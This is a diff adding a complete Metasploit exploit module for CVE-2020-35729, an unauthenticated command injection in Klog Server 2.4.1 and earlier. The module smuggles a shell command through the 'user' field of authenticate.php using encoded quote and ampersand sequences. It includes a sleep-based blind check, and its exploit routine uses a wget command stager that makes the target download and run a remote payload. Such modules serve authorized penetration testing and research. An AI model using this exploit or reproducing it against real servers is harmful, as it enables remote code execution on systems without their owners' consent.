@@ -1,0 +1,104 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+                      'Name'           => 'Klog Server Unauthenticated Command Injection Vulnerability',
+                      'Description'    => %q{
+                        This module exploits an unauthenticated command injection vulnerability in Klog Server <= 2.4.1.
+                        "user" parameter is executed via shell_exec() function without input validation.
+                      },
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [ 'B3KC4T', # Vulnerability discovery
+                          'Metin Yunus Kandemir',  # Metasploit module
+                        ],
+                      'References'     =>
+                        [
+                          ['CVE', '2020-35729'],
+                          ['URL', 'https://docs.unsafe-inline.com/0day/klog-server-unauthentication-command-injection']
+                        ],
+
+                      'DefaultOptions' =>
+                        {
+                          'HttpClientTimeout' => 2,
+                        },
+                      'Platform'       => [ 'unix', 'linux' ],
+                      'Arch'           => [ ARCH_X64 ],
+                      'Targets'        => [
+                        ['Klog Server 2.4.1 (x64)', {
+                          'Platform'    => 'linux',
+                          'Arch'        => ARCH_X64,
+                        }],
+                      ],
+                      'Privileged'      => false,
+                      'DisclosureDate' => "2021-01-05",
+                      'DefaultTarget'  => 0))
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
+        OptString.new('TARGETURI', [true, 'The base path of the Klog Server', '/']),
+      ]
+    )
+  end
+
+  def filter_bad_chars(cmd)
+    cmd.gsub!(/chmod \+x/, 'chmod 777')
+    cmd.gsub!(/;/, " %0A ")
+    cmd.gsub!(/ /, '+')
+    cmd.gsub!(/\//, '%2F')
+
+  end
+
+  def execute_command(cmd, opts = {})
+    command_payload = "unsafe+%22%26+#{filter_bad_chars(cmd)}%26%22"
+
+    print_status("Sending stager payload...")
+    uri = target_uri.path
+    res= send_request_cgi({
+                            'method'        => 'POST',
+                            'uri'           => normalize_uri(uri, 'actions', 'authenticate.php'),
+                            'encode_params' => false,
+                            'vars_post'      => {
+                              'user' => command_payload,
+                              'pswd' => "inline"
+                            }
+                          })
+    if res && res.code == 302
+      print_error("The target is not vulnerable!")
+    else
+      print_good("The target is vulnerable!")
+    end
+  end
+
+  def check
+    uri = target_uri.path
+    res= send_request_cgi({
+                            'method'        => 'POST',
+                            'uri'           => normalize_uri(uri, 'actions', 'authenticate.php'),
+                            'encode_params' => false,
+                            'vars_post'      => {
+                              'user' => "unsafe+%22%26sleep+40%26%22", #checking blind command injection via sleep
+                              'pswd' => "inline"
+                            }
+                          })
+    if res && res.code == 302
+      return Exploit::CheckCode::Safe
+    else
+      return Exploit::CheckCode::Vulnerable
+    end
+  end
+
+  def exploit
+    print_status("Exploiting...")
+    execute_cmdstager(flavor: :wget, delay: 10)
+  end
+end
